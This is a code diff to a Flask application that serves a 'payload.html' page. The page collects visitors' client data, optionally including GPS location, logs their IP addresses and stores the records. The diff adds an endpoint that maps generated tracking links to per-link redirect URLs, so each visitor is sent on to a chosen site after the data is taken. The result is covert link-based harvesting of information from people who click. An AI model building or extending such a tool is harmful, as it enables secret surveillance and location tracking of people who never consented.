@@ -13,7 +13,7 @@ import logging
 import requests
 import threading
 from src.Cloudflared import Cloudflared
-from src.DatabaseSchema import init_db, UserInfoSchema
+from src.DatabaseSchema import init_db, UserInfoSchema, get_all_links, insert_link
 import time
 
 app = Flask(__name__)
@@ -246,6 +246,7 @@ def clear_database():
         with sqlite3.connect(db_path) as conn:
             cursor = conn.cursor()
             cursor.execute("DELETE FROM user_info")  # Clear all records from the user_info table
+            cursor.execute("DELETE FROM links")
             conn.commit()
         logging.info("Database cleared successfully.")
         return jsonify({"status": "success", "message": "Database cleared."}), 200
@@ -254,15 +255,27 @@ def clear_database():
         return jsonify({"status": "error", "message": "Error clearing database."}), 500
 
 
+@app.route("/generate-link", methods=["POST"])
+def generate_link():
+    # Make sure user is authenticated
+    if not session.get('authenticated'):
+        logging.error(f"Unauthenticated request to generate link from {request.remote_addr}")
+        return jsonify({"status": "error", "message": "Unauthorized access"}), 403
+
+    data = request.json
+    link1 = data.get("generatedLink", "")
+    link2 = data.get("redirectUrl", "")
+    insert_link(db_path, link1, link2)
+
+    return jsonify({"status": "success", "message": "Links successfully inserted into database"})
+
+
 @app.route('/', methods=["GET", 'POST'], defaults={"path": ""})
-@app.route("/<path:path>")
+@app.route("/<path:path>", methods=["GET", 'POST'])
 def user_info(path):
     # Log the clients information with in index page that loads the javascript
     if request.method == "GET":
-        print(path)
-
-        # return "debugging get method"
-        return render_template('payload.html', redirect_url=redirect_url, attempt_geolocation=gps)
+        return render_template('payload.html', attempt_geolocation=gps)
 
     user_data = request.json
 
@@ -272,16 +285,22 @@ def user_info(path):
 
     try:
         validated_data = schema.load(user_data)
-    except ValidationError as err:
-        print(err.messages)
-        print(json.dumps(user_data, indent=4))
-        return jsonify(err.messages), 400  # Return 400 for bad request
+    except ValidationError:
+        return jsonify({"status": "error", "message": "Incorrect schema"}), 400
 
     # Start new thread to processes the data and insert it into the database
     logging.info(f"Processing new client data from {request.remote_addr}")
     _ = threading.Thread(target=process_client_info, args=[validated_data,], daemon=True).start()
 
-    return jsonify({"status": "success", "redirect": redirect_url})
+    url = request.url
+    links = get_all_links(db_path)
+
+    for generated_link, redirect_link in links:
+        if url.strip() == generated_link.strip():
+            logging.info(f"Redirecting {request.remote_addr} to {redirect_link}")
+            return jsonify({"status": "success", "redirect": redirect_link})
+
+    return jsonify({"status": "success", "redirect": "https://localhost"})
 
 
 def generate_self_signed_cert(cert_path, key_path):
@@ -301,7 +320,6 @@ def generate_self_signed_cert(cert_path, key_path):
 
 def parse_args():
     parser = argparse.ArgumentParser(description='Run the Flask application.')
-    parser.add_argument("-r", '--redirect_url', type=str, required=True, help='URL to redirect to after form submission.')
     parser.add_argument("-d", '--debug', action='store_true', help='Enable debug mode.')
     parser.add_argument('--ssl-cert', type=str, default="etc/cert.pem", help='Path to the SSL certificate file (Default etc/cert.pem).')
     parser.add_argument('--ssl-key', type=str, default="etc/key.pem", help='Path to the SSL key file (Default etc/key.pem).')
@@ -345,7 +363,6 @@ def main():
 if __name__ == "__main__":
     args = parse_args()
     init_db(db_path)
-    redirect_url = args.redirect_url
     gps = args.gps
 
     # Display the generated password
